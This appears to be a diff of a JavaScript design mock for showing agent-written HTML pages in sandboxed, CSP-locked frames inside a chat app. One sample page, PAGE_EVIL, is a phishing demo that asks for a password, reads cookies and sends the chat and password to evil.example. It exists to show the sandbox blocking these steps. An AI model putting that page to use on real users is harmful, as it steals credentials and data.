+<body>
+<div class="sim">
+  <div class="controls">
+    <label><span class="lab">Reintentos <b id="nv"></b></span><input id="n" type="range" min="1" max="8" value="6"></label>
+    <label><span class="lab">Espera inicial <b id="bv"></b></span><input id="b" type="range" min="50" max="1000" step="50" value="250"></label>
+    <label>Multiplicador <span class="seg" id="m"><button aria-pressed="false" data-v="1.5">×1,5</button><button aria-pressed="true" data-v="2">×2</button><button aria-pressed="false" data-v="3">×3</button></span></label>
+  </div>
+  <div class="bars" id="bars" aria-label="Espera antes de cada reintento"></div>
+  <div class="sum"><span>Espera total <b id="tot"></b></span><span>La más larga <b id="max"></b></span><span>Toca el tope de 30 s <b id="cap"></b></span></div>
+</div>
+<script>
+  var n = document.getElementById('n'), b = document.getElementById('b'), m = 2;
+  function fmt(ms) { return ms >= 1000 ? (ms / 1000).toFixed(1).replace('.', ',') + ' s' : Math.round(ms) + ' ms'; }
+  function draw() {
+    var waits = [], total = 0, max = 0;
+    for (var i = 0; i < +n.value; i++) { var w = Math.min(+b.value * Math.pow(m, i), 30000); waits.push(w); total += w; max = Math.max(max, w); }
+    document.getElementById('nv').textContent = n.value;
+    document.getElementById('bv').textContent = b.value + ' ms';
+    var bars = document.getElementById('bars'); bars.textContent = '';
+    waits.forEach(function (w) { var d = document.createElement('div'), s = document.createElement('span'); d.style.height = Math.max(3, w / max * 100) + '%'; s.textContent = fmt(w); d.appendChild(s); bars.appendChild(d); });
+    document.getElementById('tot').textContent = fmt(total);
+    document.getElementById('max').textContent = fmt(max);
+    document.getElementById('cap').textContent = max >= 30000 ? 'sí' : 'no';
+  }
+  n.oninput = b.oninput = draw;
+  document.getElementById('m').onclick = function (e) {
+    var t = e.target.closest('button'); if (!t) return;
+    m = +t.dataset.v;
+    this.querySelectorAll('button').forEach(function (x) { x.setAttribute('aria-pressed', String(x === t)); });
+    draw();
+  };
+  draw();
+<\/script>
+</body>
+</html>`;
+
+const PAGE_EVIL = `<!doctype html>
+<html lang="es">
+<head>
+<title>Verificación de cuenta</title>
+<style>
+  .card { max-width: 430px; padding: 18px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--card); }
+  .card h1 { margin: 0 0 4px; font-size: 14px; font-weight: 600; }
+  .card p { margin: 0 0 12px; color: var(--muted-foreground); font-size: 12.5px; }
+  .card input { box-sizing: border-box; width: 100%; height: 32px; padding: 0 10px; border: 1px solid var(--border); border-radius: 8px; background: var(--input); color: var(--foreground); font: inherit; }
+  .row { display: flex; align-items: center; gap: 12px; margin-top: 10px; }
+  .row button { height: 30px; padding: 0 14px; border: 0; border-radius: 8px; background: var(--primary); color: var(--primary-foreground); font: inherit; font-weight: 600; cursor: pointer; }
+  .row a { font-size: 12.5px; }
+  .log { margin-top: 14px; padding: 10px 12px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--code-background); color: var(--code-foreground); font: 11.5px/1.75 var(--font-mono); }
+  .log div { display: grid; grid-template-columns: 1fr auto; gap: 16px; }
+  .log b { color: var(--foreground); font-weight: 500; }
+  .log b.bad { color: var(--destructive); }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Workass necesita verificar tu sesión</h1>
+  <p>Por seguridad, ingresá la contraseña de tu cuenta para seguir usando los agentes.</p>
+  <input id="pw" type="password" placeholder="Contraseña" autocomplete="off">
+  <div class="row"><button id="go" type="button">Continuar</button><a href="https://evil.example/login">Usar otra cuenta</a></div>
+</div>
+<div class="log" id="log"></div>
+<script>
+  var log = document.getElementById('log'), rows = {};
+  function row(key, what) { var d = document.createElement('div'), s = document.createElement('span'), r = document.createElement('b'); s.textContent = what; r.textContent = '…'; d.appendChild(s); d.appendChild(r); log.appendChild(d); rows[key] = d; }
+  function mark(key, text, bad, force) { var d = rows[key]; if (!d || (d.dataset.done && !force) || d.dataset.bad) return; d.dataset.done = '1'; if (bad) d.dataset.bad = '1'; d.lastChild.textContent = text; d.lastChild.className = bad ? 'bad' : ''; }
+  document.addEventListener('securitypolicyviolation', function (e) {
+    var u = String(e.blockedURI), k = /collect/.test(u) ? 'fetch' : /pixel/.test(u) ? 'img' : /^ws/.test(u) ? 'ws' : /steal/.test(u) ? 'pw' : '';
+    if (k) mark(k, 'bloqueado · CSP ' + e.effectiveDirective, false, true);
+  });
+  row('cookie', 'Leer las cookies de Workass');
+  try { var c = document.cookie; mark('cookie', 'leyó "' + c + '"', true); } catch (e) { mark('cookie', 'bloqueado · origen opaco'); }
+  row('storage', 'Leer el localStorage de Workass');
+  try { localStorage.getItem('workass'); mark('storage', 'lo leyó', true); } catch (e) { mark('storage', 'bloqueado · origen opaco'); }
+  row('parent', 'Leer la ventana de Workass');
+  try { mark('parent', 'leyó "' + parent.document.title + '"', true); } catch (e) { mark('parent', 'bloqueado · otro origen'); }
+  row('fetch', 'Mandar el chat a evil.example');
+  fetch('https://evil.example/collect?chat=1').then(function () { mark('fetch', 'enviado', true); }, function () { mark('fetch', 'bloqueado'); });
+  row('ws', 'Conectarse al daemon local');
+  try { var ws = new WebSocket('ws://127.0.0.1:9/wire'); ws.onopen = function () { mark('ws', 'conectado', true); }; ws.onerror = function () { mark('ws', 'bloqueado'); }; } catch (e) { mark('ws', 'bloqueado · ' + e.name); }
+  row('img', 'Cargar un píxel de rastreo');
+  var im = new Image(); im.onload = function () { mark('img', 'cargó', true); }; im.onerror = function () { mark('img', 'bloqueado'); }; im.src = 'https://evil.example/pixel.gif?id=42';
+  row('open', 'Abrir una ventana nueva');
+  try { var w = window.open('https://evil.example/'); mark('open', w ? 'se abrió' : 'bloqueado · sin allow-popups', !!w); } catch (e) { mark('open', 'bloqueado · ' + e.name); }
+  row('top', 'Llevar Workass a otra página');
+  try { top.location.href = 'https://evil.example/'; setTimeout(function () { mark('top', 'bloqueado · sin allow-top-navigation'); }, 80); } catch (e) { mark('top', 'bloqueado · sin allow-top-navigation'); }
+  row('alert', 'Mostrar un alert()');
+  alert('Tu sesión expiró'); mark('alert', 'ignorado · sin allow-modals');
+  row('rtc', 'Abrir un canal WebRTC');
+  mark('rtc', typeof RTCPeerConnection === 'undefined' ? 'no existe · quitado al arrancar' : 'disponible', typeof RTCPeerConnection !== 'undefined');
+  document.getElementById('go').onclick = function () {
+    row('pw', 'Enviar la contraseña');
+    fetch('https://evil.example/steal?pw=' + encodeURIComponent(document.getElementById('pw').value)).then(function () { mark('pw', 'enviada', true); }, function () { mark('pw', 'bloqueado'); });
+  };
+  setTimeout(function () { for (var k in rows) mark(k, 'sin respuesta'); }, 2500);
+<\/script>
+</body>
+</html>`;
+
+const PAGE_COV = `<!doctype html>
+<html lang="es">
+<head>
+<title>Cobertura por paquete</title>
+<style>
+  h1 { margin: 0 0 10px; font-size: 15px; font-weight: 600; }
+  .row { display: grid; grid-template-columns: 190px 1fr 52px; align-items: center; gap: 14px; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 12.5px; }
+  .row code { font-size: 12px; }
+  .meter { height: 8px; overflow: hidden; border-radius: 4px; background: var(--muted); }
+  .meter i { display: block; height: 100%; border-radius: 4px; background: var(--chart-2); }
+  .pct { font: 12px var(--font-mono); text-align: right; }
+  p { margin: 10px 0 0; color: var(--muted-foreground); font-size: 12.5px; }
+</style>
+</head>
+<body>
+<h1>Cobertura por paquete · corrida de hoy</h1>
+<div class="row"><code>internal/durablefs</code><div class="meter"><i style="width:95%"></i></div><span class="pct">95 %</span></div>
+<div class="row"><code>internal/wire</code><div class="meter"><i style="width:91%"></i></div><span class="pct">91 %</span></div>
+<div class="row"><code>internal/artifacthost</code><div class="meter"><i style="width:88%"></i></div><span class="pct">88 %</span></div>
+<div class="row"><code>internal/chat</code><div class="meter"><i style="width:84%"></i></div><span class="pct">84 %</span></div>
+<div class="row"><code>internal/acp</code><div class="meter"><i style="width:77%"></i></div><span class="pct">77 %</span></div>
+<div class="row"><code>internal/httpserve</code><div class="meter"><i style="width:73%"></i></div><span class="pct">73 %</span></div>
+<div class="row"><code>internal/provider</code><div class="meter"><i style="width:69%"></i></div><span class="pct">69 %</span></div>
+<div class="row"><code>internal/fleet</code><div class="meter"><i style="width:64%"></i></div><span class="pct">64 %</span></div>
+<div class="row"><code>cmd/workass</code><div class="meter"><i style="width:58%"></i></div><span class="pct">58 %</span></div>
+<p>Total 76 % · 9 paquetes · los tres últimos son los que más bajaron esta semana.</p>
+</body>
+</html>`;
+
+/* ───────────────────────────── the thread ───────────────────────────── */
+const THREAD = [
+  { user: 'Armame un tablero con la latencia del daemon de las últimas 24 horas.' },
+  { id: 't1', parts: [
+    { p: 'El pico de las 14 h es la reconexión de los tres bridges; el resto del día el p95 quedó debajo de 190 ms.' },
+    { html: PAGE_DASH, info: 'html preview', id: 'dash' },
+    { p: 'Si querés, mañana a la misma hora lo repito para comparar.' },
+  ] },
+  { user: '¿Cómo quedarían los chips de estado con estos colores?' },
+  { id: 't2', parts: [
+    { p: 'Así, con el color solo en el punto:' },
+    { html: PAGE_CHIPS, info: 'html', id: 'chips' },
+  ] },
+  { user: 'Haceme un simulador para elegir el backoff de los reintentos.' },
+  { id: 't3', parts: [
+    { p: 'Mové los controles; la página recalcula sola.' },
+    { html: PAGE_SIM, info: 'html preview', id: 'sim' },
+  ] },
+  { user: 'Me llegó este HTML por mail. ¿Es seguro abrirlo?' },
+  { id: 't4', parts: [
+    { p: 'Lo abrí dentro del sandbox. Pide tu contraseña e intenta leer tus datos y mandarlos afuera; el registro de abajo es lo que consiguió.' },
+    { html: PAGE_EVIL, info: 'html preview', id: 'evil' },
+    { p: 'Nada: no tiene red ni acceso a Workass. Igual no escribas nada ahí, es phishing.' },
+  ] },
+  { user: 'Ahora un informe de cobertura por paquete.' },
+  { id: 't5', running: true, parts: [
+    { p: 'Con los números de la corrida de hoy:' },
+    { html: PAGE_COV, info: 'html preview', id: 'cov', streaming: true },
+  ] },
+];
+
+/* ───────────────────────────── variants ───────────────────────────── */
+const GROUPS = [
+  { key: 'marco', label: 'Marco', opts: [
+    { v: 'a', t: 'A · Sin marco, controles al pasar', ref: 't3code HtmlRenderFrame.tsx:92-132',
+      note: 't3code\'s html_render frame: the page sits borderless on the thread background, aligned with the reply text, and one glass button appears on hover (the first page shows it). Quietest, but the code switch stays hidden until you hover, and the page can paint something that looks like Workass\'s own UI.' },
+    { v: 'b', t: 'B · Sin marco, fila de íconos', rec: true, ref: 't3code MarkdownCodeBlock.tsx:223-231',
+      note: 't3code\'s rule for a fenced block it renders (Mermaid): borderless page, with a slim right-aligned row above it that is always visible: show code, copy, expand. Same calm as A, and the switch is never hidden.' },
+    { v: 'c', t: 'C · Dentro del bloque de código', ref: 'Workass .codebox (app.css:653)',
+      note: 'Workass\'s existing code block gains a Página | Código switch in its head, and the page renders inside the box. Most explicit about what is the agent\'s page, at the cost of the box and its 33px head.' },
+  ] },
+  { key: 'altura', label: 'Altura', opts: [
+    { v: 'full', t: 'Completa', ref: 't3code htmlRender.ts:14 (20.000 px)',
+      note: 'The frame fits the whole page, up to 20,000px, so nothing ever scrolls inside the chat. A long page becomes a long stretch of transcript.' },
+    { v: 'cap', t: 'Hasta una pantalla', rec: true, ref: 'new · cap 640 px in this mock',
+      note: 'Fits the page up to about one screen of transcript, then cuts it with a short fade and Mostrar todo, which grows it in place. Nothing scrolls inside the chat either, and a long page stops pushing the conversation apart.' },
+  ] },
+  { key: 'vista', label: 'Vista inicial', opts: [
+    { v: 'page', t: 'Página primero', rec: true, ref: 't3code MarkdownMermaidCodeBlock.tsx:26-30',
+      note: 'A finished html block shows its page; the switch shows the code, and copy always copies the code.' },
+    { v: 'code', t: 'Código primero', ref: 'Workass today',
+      note: 'Shows the code, as today; the switch renders the page on demand. Never surprises, but every page costs a click.' },
+    { v: 'agent', t: 'Lo marca el agente', ref: 't3code html_render (tools.ts:74)',
+      note: 'Renders only blocks the agent tags ```html preview; a plain ```html stays code (the chips here). Closest to t3code\'s intent, where a page is published on purpose, but agents must be told the tag.' },
+  ] },
+  { key: 'stream', label: 'Mientras se escribe', opts: [
+    { v: 'code', t: 'Código en vivo', ref: 't3code Mermaid · Workass today',
+      note: 'The code streams in as today; when the fence closes it turns into the page. A long page means hundreds of lines flowing, then a jump.' },
+    { v: 'line', t: 'Una línea', rec: true, ref: 'new',
+      note: 'One quiet line with the size so far; Ver código peeks at it. The page appears when the block closes, so the transcript stays still while it writes.' },
+    { v: 'live', t: 'Página en vivo', ref: 'new · t3code never does this',
+      note: 'Renders the half-written page as it arrives, with its scripts held until the end. Lively, but it flickers and reflows while it writes.' },
+  ] },
+  { key: 'expand', label: 'Ampliar', opts: [
+    { v: 'dialog', t: 'Diálogo con zoom', rec: true, ref: 't3code HtmlRenderDialog.tsx',
+      note: 'Over the chat at 92% of the window, zoom 50-200%, Esc or the close button returns.' },
+    { v: 'full', t: 'Ventana completa', ref: 'Workass browser full screen (app.css:2374)',
+      note: 'The page fills the Workass window under one slim bar. Bigger, but the chat disappears completely.' },
+  ] },
+];
+const RECOMMENDED = Object.fromEntries(GROUPS.map((g) => [g.key, g.opts.find((o) => o.rec).v]));
+
+const q = new URLSearchParams(location.search);
+const STATE = { theme: q.get('theme') === 'light' ? 'light' : 'dark', ...RECOMMENDED, open: q.get('open') === '1', progress: Number(q.get('progress')) || 0.55, hover: q.get('hover') !== '0' };
+for (const g of GROUPS) { const v = q.get(g.key); if (g.opts.some((o) => o.v === v)) STATE[g.key] = v; }
+const userView = new Map();      // block id -> 'page' | 'code' chosen with the switch
+const opened = new Set();        // capped blocks the reader grew with Mostrar todo
+let streamDone = false;
+
+/* ─────────────────────── frame: srcdoc + bootstrap ─────────────────────── */
+// The policy is the first element of <head>, so it binds before any byte of the
+// agent's markup. The agent's document is appended after our <body>: the parser
+// folds a second <html>/<head>/<body> into the existing ones and a <meta> CSP
+// outside <head> is ignored, so a page can only ever tighten this, never loosen it.
+const CSP = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; worker-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'";
+const SANDBOX = 'allow-scripts allow-forms';
+const BASE_CSS = 'html{background:var(--background);color:var(--foreground);font-family:var(--font-sans);font-size:13.5px;line-height:1.6;-webkit-font-smoothing:antialiased;-webkit-text-size-adjust:100%;scrollbar-width:none}html::-webkit-scrollbar{display:none}body{margin:0}code,kbd,pre,samp{font-family:var(--font-mono)}a{color:var(--link)}:where(:focus-visible){outline:2px solid var(--ring);outline-offset:-2px}';
+
+// Runs inside the frame, before the page's own scripts. Serialized with toString().
+function bootstrap(BASE) {
+  ['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCDataChannel', 'RTCSessionDescription', 'RTCIceCandidate'].forEach(function (k) { try { delete window[k]; } catch (e) {} });
+  var P = window.parent, s = document.getElementById('wa-theme'), last = -1;
+  function apply(d) {
+    if (!d.vars || typeof d.vars !== 'object') return;
+    var c = ':root{color-scheme:' + (d.scheme === 'light' ? 'light' : 'dark') + ';';
+    for (var k in d.vars) if (/^--[a-z0-9-]+$/.test(k)) c += k + ':' + String(d.vars[k]).replace(/[;{}<>]/g, '') + ';';
+    s.textContent = c + '}' + BASE;
+  }
+  window.addEventListener('message', function (e) {
+    var d = e.data;
+    if (e.source === P && d && typeof d === 'object' && d.type === 'wa-html:theme') apply(d);
+  });
+  function size() {
+    var r = document.documentElement;
+    var v = Math.ceil(r.scrollHeight > r.clientHeight ? r.scrollHeight : r.getBoundingClientRect().height);
+    if (v === last) return;
+    last = v;
+    P.postMessage({ type: 'wa-html:size', height: v }, '*');
+  }
+  if (window.ResizeObserver) {
+    var o = new ResizeObserver(size);
+    o.observe(document.documentElement);
+    document.addEventListener('DOMContentLoaded', function () { if (document.body) o.observe(document.body); size(); });
+  }
+  window.addEventListener('load', size);
+  document.addEventListener('click', function (e) {
+    var t = e.target, a = t && t.closest ? t.closest('a[href]') : null, u;
+    if (!a) return;
+    e.preventDefault();
+    if (!e.isTrusted) return;
+    try { u = new URL(a.getAttribute('href')); } catch (x) { return; }
+    if (u.protocol === 'https:' || u.protocol === 'http:') P.postMessage({ type: 'wa-html:link', url: u.href }, '*');
+  }, true);
+  window.addEventListener('keydown', function (e) { if (e.key === 'Escape') P.postMessage({ type: 'wa-html:escape' }, '*'); });
+}
+
+function themeVars() {
+  const cs = getComputedStyle(document.documentElement);
+  const v = (n) => cs.getPropertyValue(n).trim();
+  // t3code's variable names (htmlRender.ts:182-229), so one page works in both apps.
+  return {
+    '--background': v('--bg'), '--foreground': v('--ink'), '--muted': v('--field'), '--muted-foreground': v('--muted'),
+    '--card': v('--panel'), '--card-foreground': v('--ink'), '--popover': v('--panel'), '--popover-foreground': v('--ink'),
+    '--secondary': v('--field'), '--secondary-foreground': v('--ink2'), '--border': v('--line2'), '--input': v('--field'), '--ring': v('--link'),
+    '--primary': v('--ink'), '--primary-foreground': v('--bg'), '--accent': v('--acc'), '--accent-foreground': v('--bg'),
+    '--link': v('--link'), '--destructive': v('--del'), '--warning': v('--amber'), '--success': v('--add'), '--info': v('--link'),
+    '--code-background': v('--field'), '--code-foreground': v('--ink2'),
+    '--chart-1': v('--acc'), '--chart-2': v('--link'), '--chart-3': v('--amber'), '--chart-4': v('--del'), '--chart-5': v('--muted'),
+    '--radius': '10px',
+    '--font-sans': '-apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif',
+    '--font-mono': '"SF Mono", "SFMono-Regular", Menlo, Consolas, monospace',
+  };
+}
+function rootRule(vars) { let s = ':root{color-scheme:' + STATE.theme + ';'; for (const k in vars) s += k + ':' + vars[k] + ';'; return s + '}'; }
+
+function srcdocFor(source, holdScripts) {
+  const body = holdScripts ? source.replace(/<script\b[\s\S]*?(<\/script\s*>|$)/gi, '') : source;
+  return '<!doctype html><html><head>'
+    + '<meta http-equiv="Content-Security-Policy" content="' + CSP + '">'
+    + '<meta http-equiv="x-dns-prefetch-control" content="off">'
+    + '<meta name="viewport" content="width=device-width,initial-scale=1">'
+    + '<style id="wa-theme">' + rootRule(themeVars()) + BASE_CSS + '</style>'
+    + '<script>(' + bootstrap.toString() + ')(' + JSON.stringify(BASE_CSS) + ');<\/script>'
+    + '</head><body>' + body;
+}
+
+function makeFrame(block, opts = {}) {
+  const f = document.createElement('iframe');
+  f.className = 'hb-frame';
+  f.setAttribute('sandbox', SANDBOX);              // never allow-same-origin
+  f.setAttribute('referrerpolicy', 'no-referrer');
+  f.title = titleOf(block.html);
+  f.style.colorScheme = STATE.theme;              // matches the page's root, so no opaque white canvas
+  if (opts.fill) f.dataset.fill = '1';
+  f.srcdoc = srcdocFor(opts.partial ?? block.html, !!opts.partial);
+  f.addEventListener('load', () => setTimeout(() => f.classList.add('sized'), 250));
+  return f;
+}
+
+// Host side: only three message shapes are accepted, and only from a frame we made.
+window.addEventListener('message', (e) => {
+  const d = e.data;
+  if (!d || typeof d !== 'object' || typeof d.type !== 'string') return;
+  const frame = [...document.querySelectorAll('iframe.hb-frame')].find((f) => f.contentWindow === e.source);
+  if (!frame) return;
+  if (d.type === 'wa-html:size' && Number.isFinite(d.height) && d.height > 0 && !frame.dataset.fill) {
+    const h = Math.min(20000, Math.max(16, Math.ceil(d.height)));
+    frame.style.height = h + 'px';
+    frame.classList.add('sized');
+    const hb = frame.closest('.hb'), clip = frame.closest('.hb-clip');
+    if (hb && clip) hb.classList.toggle('overflow', clip.scrollHeight > 641);
+  } else if (d.type === 'wa-html:link' && typeof d.url === 'string' && /^https?:\/\//i.test(d.url) && document.activeElement === frame) {
+    askLink(d.url);
+  } else if (d.type === 'wa-html:escape') {
+    closeOverlay();
+  }
+});
+
+/* ─────────────────────────── rendering ─────────────────────────── */
+const el = (tag, cls, html) => { const n = document.createElement(tag); if (cls) n.className = cls; if (html != null) n.innerHTML = html; return n; };
+const icon = (id) => '<svg class="ic"><use href="#i-' + id + '"/></svg>';
+const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+function titleOf(src) {
+  const t = /<title>([^<]*)<\/title>/i.exec(src) || /<h1[^>]*>([^<]*)</i.exec(src);
+  return (t && t[1].trim()) || 'Página HTML';
+}
+function inline(text) { return esc(text).replace(/`([^`]+)`/g, '<code>$1</code>').replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>'); }
+
+// A small markup highlighter using the code block's existing token classes.
+function highlightHtml(src) {
+  let out = '', i = 0, raw = null;
+  const n = src.length, lower = src.toLowerCase();
+  while (i < n) {
+    if (raw) { const e = lower.indexOf('</' + raw, i); const stop = e === -1 ? n : e; out += esc(src.slice(i, stop)); i = stop; raw = null; continue; }
+    if (src.startsWith('<!--', i)) { const e = src.indexOf('-->', i); const stop = e === -1 ? n : e + 3; out += '<span class="tk-cm">' + esc(src.slice(i, stop)) + '</span>'; i = stop; continue; }
+    const m = src[i] === '<' ? /^<\/?[!a-zA-Z][\w:-]*/.exec(src.slice(i, i + 40)) : null;
+    if (m) {
+      const closing = m[0][1] === '/', name = m[0].replace(/^<\/?/, '');
+      out += '<span class="tk-op">&lt;' + (closing ? '/' : '') + '</span><span class="tk-kw">' + esc(name) + '</span>';
+      i += m[0].length;
+      while (i < n && src[i] !== '>') {
+        const rest = src.slice(i, i + 400); let mm;
+        if ((mm = /^\s+/.exec(rest))) out += mm[0];
+        else if ((mm = /^"[^"]*"|^'[^']*'/.exec(rest))) out += '<span class="tk-str">' + esc(mm[0]) + '</span>';
+        else if ((mm = /^[^\s=>"'\/]+/.exec(rest))) out += '<span class="tk-attr">' + esc(mm[0]) + '</span>';
+        else { mm = [src[i]]; out += '<span class="tk-op">' + esc(src[i]) + '</span>'; }
+        i += mm[0].length;
+      }
+      if (i < n) { out += '<span class="tk-op">&gt;</span>'; i++; }
+      if (!closing && /^(script|style)$/i.test(name)) raw = name.toLowerCase();
+      continue;
+    }
+    const next = src.indexOf('<', i + 1); const stop = next === -1 ? n : next;
+    out += esc(src.slice(i, stop)); i = stop;
+  }
+  return out;
+}
+
+function viewOf(block) {
+  if (userView.has(block.id)) return userView.get(block.id);
+  if (STATE.vista === 'code') return 'code';
+  if (STATE.vista === 'agent') return /\bpreview\b/.test(block.info) ? 'page' : 'code';
+  return 'page';
+}
+function setView(block, view) { userView.set(block.id, view); renderTurnOf(block.id); }
+
+function copyButton(block, cls) {
+  const b = el('button', cls, icon('copy') + (cls === 'code-copy' ? '<span>Copiar</span>' : ''));
+  b.type = 'button'; b.title = 'Copiar código'; b.setAttribute('aria-label', 'Copiar código');
+  b.onclick = () => {
+    try { navigator.clipboard.writeText(block.html).catch(() => {}); } catch (e) {}
+    b.dataset.state = 'copied';
+    b.innerHTML = icon('check') + (cls === 'code-copy' ? '<span>Copiado</span>' : '');
+    setTimeout(() => { b.dataset.state = 'idle'; b.innerHTML = icon('copy') + (cls === 'code-copy' ? '<span>Copiar</span>' : ''); }, 1600);
+  };
+  return b;
+}
+function iconButton(id, label, onclick, cls = 'hbtn') {
+  const b = el('button', cls, icon(id)); b.type = 'button'; b.title = label; b.setAttribute('aria-label', label); b.onclick = onclick; return b;
+}
+function moreButton(block, hb) {
+  const b = el('button', 'hb-more', '<span>' + (opened.has(block.id) ? 'Mostrar menos' : 'Mostrar todo') + '</span>' + icon('down'));
+  b.type = 'button';
+  b.onclick = () => { if (opened.has(block.id)) opened.delete(block.id); else opened.add(block.id); hb.classList.toggle('open', opened.has(block.id)); b.firstChild.textContent = opened.has(block.id) ? 'Mostrar menos' : 'Mostrar todo'; };
+  return b;
+}
+
+function codeBox(block, { toggle = true, streaming = false, partial = '' } = {}) {
+  const box = el('div', 'codebox hb-code');
+  const head = el('div', 'code-head', '<span class="code-lang">html</span>');
+  if (!streaming && toggle) {
+    if (STATE.marco === 'c') head.appendChild(segment(block, 'code'));
+    else { const t = el('button', 'code-copy', icon('page') + '<span>Página</span>'); t.type = 'button'; t.title = 'Ver la página'; t.onclick = () => setView(block, 'page'); head.appendChild(t); }
+  }
+  head.appendChild(copyButton(block, 'code-copy'));
+  box.appendChild(head);
+  const pre = el('pre', 'code-body');
+  pre.innerHTML = '<code>' + (streaming ? esc(partial) + '<span class="caret"></span>' : highlightHtml(block.html)) + '</code>';
+  box.appendChild(pre);
+  return box;
+}
+function segment(block, active) {
+  const s = el('span', 'hb-seg');
+  for (const [v, label] of [['page', 'Página'], ['code', 'Código']]) {
+    const b = el('button', '', label); b.type = 'button'; b.setAttribute('aria-pressed', String(v === active));
+    b.onclick = () => setView(block, v); s.appendChild(b);
+  }
+  return s;
+}
+
+function pageBlock(block, { partial = null } = {}) {
+  const live = partial != null;
+  const marco = STATE.marco;
+  const capped = STATE.altura === 'cap';
+  const hb = el('div', 'hb hb-' + marco + (capped ? ' capped' : '') + (opened.has(block.id) ? ' open' : ''));
+  hb.dataset.block = block.id;
+  const clip = el('div', 'hb-clip' + (marco === 'c' ? ' hb-body' : ''));
+  clip.appendChild(makeFrame(block, live ? { partial } : {}));
+  clip.appendChild(el('div', 'hb-fade'));
+  const tools = () => [
+    iconButton('code', 'Ver el código', () => setView(block, 'code')),
+    copyButton(block, 'hbtn'),
+    iconButton('expand', 'Ampliar', () => openOverlay(block)),
+  ];
+  const liveTag = () => el('span', 'hb-live-tag', '<span class="orbit sm"></span>escribiendo');
+  if (marco === 'a') {
+    if (live) clip.appendChild(liveTag());
+    else { const pill = el('div', 'hb-pill'); tools().forEach((b) => pill.appendChild(b)); clip.appendChild(pill); if (STATE.hover && block.id === 'dash') hb.classList.add('demo-hover'); }
+    hb.appendChild(clip);
+  } else if (marco === 'b') {
+    const row = el('div', 'hb-row');
+    if (live) row.appendChild(liveTag()); else tools().forEach((b) => row.appendChild(b));
+    hb.appendChild(row); hb.appendChild(clip);
+  } else {
+    hb.classList.add('codebox');
+    const head = el('div', 'code-head', '<span class="code-lang">html</span>');
+    if (live) head.appendChild(liveTag());
+    else { head.appendChild(segment(block, 'page')); head.appendChild(copyButton(block, 'code-copy')); head.appendChild(iconButton('expand', 'Ampliar', () => openOverlay(block))); }
+    hb.appendChild(head); hb.appendChild(clip);
+  }
+  if (capped && !live) hb.appendChild(moreButton(block, hb));
+  return hb;
+}
+
+function streamingBlock(block) {
+  const partial = block.html.slice(0, Math.floor(block.html.length * STATE.progress));
+  if (STATE.stream === 'code') return codeBox(block, { streaming: true, partial });
+  if (STATE.stream === 'live') return pageBlock(block, { partial });
+  const wrap = el('div');
+  const line = el('div', 'hb-line');
+  const kb = (new Blob([partial]).size / 1024).toFixed(1).replace('.', ',');
+  const lines = partial.split('\n').length;
+  line.innerHTML = '<span class="orbit sm"></span><span class="t">Escribiendo página</span><span class="m">' + kb + ' KB · ' + lines + ' líneas</span><span class="sp"></span>';
+  const peek = el('button', 'code-copy', icon('code') + '<span>' + (userView.get(block.id + ':peek') ? 'Ocultar código' : 'Ver código') + '</span>');
+  peek.type = 'button';
+  peek.onclick = () => { userView.set(block.id + ':peek', !userView.get(block.id + ':peek')); renderTurnOf(block.id); };
+  line.appendChild(peek);
+  wrap.appendChild(line);
+  if (userView.get(block.id + ':peek')) { const box = codeBox(block, { streaming: true, partial }); box.classList.add('hb-line-peek'); wrap.appendChild(box); }
+  return wrap;
+}
+
+function htmlBlock(block) {
+  if (block.streaming && !streamDone) return streamingBlock(block);
+  return viewOf(block) === 'page' ? pageBlock(block) : codeBox(block);
+}
+
+function turnNode(turn) {
+  const a = el('div', 'amsg'); a.id = turn.id;
+  for (const part of turn.parts) a.appendChild(part.p ? el('p', 'p', inline(part.p)) : htmlBlock(part));
+  if (turn.running && !streamDone) a.appendChild(el('div', 'working', '<span class="orbit"></span>Working…<span class="meta">18s</span>'));
+  return a;
+}
+function render() {
+  const doc = document.getElementById('doc');
+  doc.textContent = '';
+  let asked = 0;
+  for (const turn of THREAD) {
+    if (turn.user) { const u = el('div', 'userpill'); u.id = 'q' + (++asked); u.appendChild(el('div', 'userpill-text', esc(turn.user))); doc.appendChild(u); continue; }
+    doc.appendChild(turnNode(turn));
+  }
+  renderChrome();
+}
+// Rebuilds one reply only, so the other pages keep running (no reload, no flash).
+function renderTurnOf(blockId) {
+  const turn = THREAD.find((t) => (t.parts || []).some((p) => p.id === blockId));
+  const old = turn && document.getElementById(turn.id);
+  if (old) old.replaceWith(turnNode(turn)); else render();
+}
+
+/* ───────────────────────────── expand ───────────────────────────── */
+let overlay = null, lastFocus = null;
+function closeOverlay() { if (!overlay) return; overlay.remove(); overlay = null; if (lastFocus) lastFocus.focus?.(); }
+function openOverlay(block) {
+  closeOverlay();
+  lastFocus = document.activeElement;
+  const title = titleOf(block.html);
+  if (STATE.expand === 'dialog') {
+    overlay = el('div', 'ovl'); overlay.setAttribute('role', 'dialog'); overlay.setAttribute('aria-modal', 'true'); overlay.setAttribute('aria-label', title + ', ampliada');
+    const close = iconButton('close', 'Cerrar', closeOverlay, 'ovl-close');
+    const dlg = el('div', 'dlg');
+    const panel = el('div', 'dlg-panel');
+    const zoomBox = el('div', 'dlg-zoom');
+    zoomBox.appendChild(makeFrame(block, { fill: true }));
+    panel.appendChild(zoomBox);
+    let zoom = 1;
+    const foot = el('div', 'dlg-foot', '<span class="dlg-title"></span>');
+    foot.firstChild.textContent = title;
+    const ctl = el('span', 'dlg-zoomctl');
+    const out = iconButton('minus', 'Alejar', () => setZoom(zoom - .25), '');
+    const pct = el('button', '', '100 %'); pct.type = 'button'; pct.title = 'Tamaño real'; pct.onclick = () => setZoom(1);
+    const inn = iconButton('plus', 'Acercar', () => setZoom(zoom + .25), '');
+    function setZoom(z) { zoom = Math.min(2, Math.max(.5, z)); zoomBox.style.zoom = zoom; pct.textContent = Math.round(zoom * 100) + ' %'; out.disabled = zoom === .5; inn.disabled = zoom === 2; }
